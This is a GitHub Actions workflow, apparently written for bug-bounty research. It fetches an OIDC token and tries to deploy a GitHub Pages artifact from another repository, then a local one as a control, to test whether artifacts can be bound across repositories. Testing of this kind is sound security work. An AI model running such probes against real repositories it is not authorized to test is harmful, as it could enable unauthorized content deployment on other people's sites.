name: Codex Pages Artifact Binding Probe
on:
  workflow_dispatch:
permissions:
  contents: read
  actions: read
  pages: write
  id-token: write
jobs:
  artifact-binding:
    environment:
      name: github-pages
    runs-on: ubuntu-latest
    steps:
      - name: Create repository B control site
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p site
          printf '<!doctype html><title>Repository B Control</title><p id="marker">CODEX_PAGES_REPO_B_CONTROL_20261113_0530</p>\n' > site/index.html
      - name: Upload repository B Pages artifact
        id: upload
        uses: actions/upload-pages-artifact@v4
        with:
          path: site
      - name: Probe foreign and local artifact selectors
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
          LOCAL_ARTIFACT_ID: ${{ steps.upload.outputs.artifact_id }}
        run: |
          set -euo pipefail
          oidc_file=$(mktemp)
          curl -sS \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL" > "$oidc_file"
          oidc_token=$(jq -r '.value' "$oidc_file")
          test -n "$oidc_token"

          foreign_payload=$(mktemp)
          jq -n \
            --argjson artifact_id 14100208478 \
            --arg pages_build_version "${GITHUB_SHA}-foreign-repo-a-artifact" \
            --arg oidc_token "$oidc_token" \
            '{artifact_id:$artifact_id,pages_build_version:$pages_build_version,oidc_token:$oidc_token}' > "$foreign_payload"
          foreign_response=$(mktemp)
          foreign_status=$(curl -sS -o "$foreign_response" -w '%{http_code}' \
            -X POST \
            -H 'Accept: application/vnd.github+json' \
            -H 'X-GitHub-Api-Version: 2022-11-28' \
            -H "Authorization: Bearer $GH_TOKEN" \
            https://api.github.com/repos/michael1026/h1-codex-dependency-b-20261113/pages/deployments \
            --data-binary "@$foreign_payload")
          echo "foreign_artifact_status=$foreign_status"
          echo "foreign_artifact_message=$(jq -r '.message // "none"' "$foreign_response")"
          echo "foreign_artifact_deployment_id=$(jq -r '.id // "none"' "$foreign_response")"

          local_payload=$(mktemp)
          jq -n \
            --argjson artifact_id "$LOCAL_ARTIFACT_ID" \
            --arg pages_build_version "$GITHUB_SHA" \
            --arg oidc_token "$oidc_token" \
            '{artifact_id:$artifact_id,pages_build_version:$pages_build_version,oidc_token:$oidc_token}' > "$local_payload"
          local_response=$(mktemp)
          local_status=$(curl -sS -o "$local_response" -w '%{http_code}' \
            -X POST \
            -H 'Accept: application/vnd.github+json' \
            -H 'X-GitHub-Api-Version: 2022-11-28' \
            -H "Authorization: Bearer $GH_TOKEN" \
            https://api.github.com/repos/michael1026/h1-codex-dependency-b-20261113/pages/deployments \
            --data-binary "@$local_payload")
          echo "local_artifact_status=$local_status"
          echo "local_artifact_message=$(jq -r '.message // "none"' "$local_response")"
          echo "local_artifact_deployment_id=$(jq -r '.id // "none"' "$local_response")"